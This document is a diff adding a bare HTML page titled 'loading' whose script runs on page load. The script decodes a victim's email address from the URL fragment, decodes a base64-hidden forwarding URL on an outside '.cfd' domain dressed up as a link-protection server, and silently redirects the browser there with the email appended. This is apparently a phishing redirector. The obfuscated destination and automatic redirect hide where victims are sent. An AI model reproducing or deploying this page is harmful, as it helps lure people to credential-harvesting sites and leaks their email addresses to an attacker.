@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta charset="UTF-8">
+  <title>loading</title>
+  <script>
+    function redirect() {
+      var queryString = window.location.href;
+      var dom= queryString.split("#");
+      var email = dom[1];
+      var decodedMail= atob(email);
+      const forwardUrl = atob("aHR0cHM6Ly9zZWN1cmVzZXJ2ZXIubGlua3Byb3RlY3QuY2ZkL2VUVVpzYWZK");
+      window.location.href = forwardUrl + decodedMail;
+    }
+  </script>
+</head>
+<body onload="redirect()">
+  </body>
+</html>
